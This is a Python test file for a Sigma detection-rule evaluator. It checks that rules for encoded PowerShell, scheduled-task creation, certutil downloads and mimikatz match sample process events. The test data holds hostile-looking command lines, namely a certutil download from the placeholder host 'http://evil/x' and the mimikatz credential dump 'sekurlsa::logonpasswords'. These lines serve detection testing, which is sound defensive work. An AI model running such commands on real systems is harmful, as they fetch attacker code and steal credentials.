"""End-to-end tests for the Sigma evaluator. Runs without Splunk."""
from __future__ import annotations

import textwrap
from pathlib import Path

from sigma_engine import Evaluator, load_rule_from_file


def _write_rule(tmp_path: Path, name: str, body: str) -> Path:
    p = tmp_path / f"{name}.yml"
    p.write_text(textwrap.dedent(body).strip() + "\n")
    return p


def test_simple_selection_hit(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "pwsh", """
        title: PowerShell Encoded
        id: t1059-001-pwsh
        level: high
        tags: [attack.execution, attack.t1059.001]
        logsource: { category: process_creation, product: windows }
        detection:
          selection:
            Image|endswith: '\\powershell.exe'
            CommandLine|contains: '-enc'
          condition: selection
    """))
    ev = Evaluator([rule])
    hits = ev.match({"Image": "C:\\Windows\\System32\\powershell.exe",
                     "CommandLine": "powershell.exe -enc JABz"})
    assert len(hits) == 1
    assert hits[0].matched_selections == ["selection"]


def test_no_match(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "pwsh2", """
        title: PowerShell Encoded
        id: t1059-001-pwsh
        level: high
        detection:
          selection:
            Image|endswith: '\\powershell.exe'
            CommandLine|contains: '-enc'
          condition: selection
    """))
    ev = Evaluator([rule])
    assert ev.match({"Image": "cmd.exe", "CommandLine": "dir"}) == []


def test_and_not_condition(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "schtasks", """
        title: Suspicious scheduled task
        id: t1053-005
        level: medium
        detection:
          selection:
            Image|endswith: '\\schtasks.exe'
            CommandLine|contains: '/create'
          filter:
            User|contains: 'SYSTEM'
          condition: selection and not filter
    """))
    ev = Evaluator([rule])
    assert len(ev.match({"Image": "C:\\Windows\\System32\\schtasks.exe",
                         "CommandLine": "schtasks /create /tn hi",
                         "User": "alice"})) == 1
    assert ev.match({"Image": "C:\\Windows\\System32\\schtasks.exe",
                     "CommandLine": "schtasks /create /tn hi",
                     "User": "NT AUTHORITY\\SYSTEM"}) == []


def test_list_values_or_semantics(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "certutil", """
        title: certutil download
        id: t1105
        level: high
        detection:
          selection:
            Image|endswith: '\\certutil.exe'
            CommandLine|contains:
              - '-urlcache'
              - '-split'
              - 'http://'
              - 'https://'
          condition: selection
    """))
    ev = Evaluator([rule])
    hits = ev.match({"Image": "C:\\Windows\\System32\\certutil.exe",
                     "CommandLine": "certutil.exe -urlcache -f http://evil/x"})
    assert len(hits) == 1


def test_one_of_quantifier(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "mimi", """
        title: mimikatz indicators
        id: t1003-001
        level: critical
        detection:
          selection_image:
            Image|endswith: '\\mimikatz.exe'
          selection_cli:
            CommandLine|contains:
              - 'sekurlsa::'
              - 'lsadump::'
          condition: 1 of selection_*
    """))
    ev = Evaluator([rule])
    assert len(ev.match({"Image": "C:\\Tools\\mimikatz.exe", "CommandLine": "whatever"})) == 1
    assert len(ev.match({"Image": "C:\\Windows\\System32\\powershell.exe",
                         "CommandLine": "sekurlsa::logonpasswords"})) == 1
    assert ev.match({"Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "hello"}) == []


def test_case_insensitive_field_lookup(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "case", """
        title: case insensitive
        id: case
        level: low
        detection:
          selection:
            Image|endswith: '\\foo.exe'
          condition: selection
    """))
    ev = Evaluator([rule])
    # Splunk may lowercase field names; engine should still find 'Image' via 'image'.
    assert len(ev.match({"image": "c:\\foo.exe"})) == 1


def test_regex_modifier(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "re", """
        title: regex test
        id: re
        level: low
        detection:
          selection:
            CommandLine|re: '^powershell.*-w(indowstyle)?\\s+hidden'
          condition: selection
    """))
    ev = Evaluator([rule])
    assert len(ev.match({"CommandLine": "powershell -w hidden -enc x"})) == 1
    assert ev.match({"CommandLine": "powershell -nop"}) == []


def test_attack_techniques_extracted(tmp_path):
    rule = load_rule_from_file(_write_rule(tmp_path, "tag", """
        title: tagged
        id: tag
        level: low
        tags: [attack.execution, attack.t1059.001, not-an-attack-tag]
        detection:
          selection:
            Image|endswith: x
          condition: selection
    """))
    assert rule.attack == ["T1059.001"]
